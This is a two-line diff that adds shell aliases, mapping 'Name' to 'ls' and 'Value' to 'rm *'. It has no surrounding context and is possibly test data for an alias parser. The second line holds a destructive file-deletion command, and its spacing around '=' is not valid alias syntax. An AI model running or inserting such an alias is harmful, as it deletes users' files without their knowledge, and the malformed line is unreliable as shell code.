@@ -1,0 +1,2 @@
+alias Name="ls"
+alias Value = "rm *"
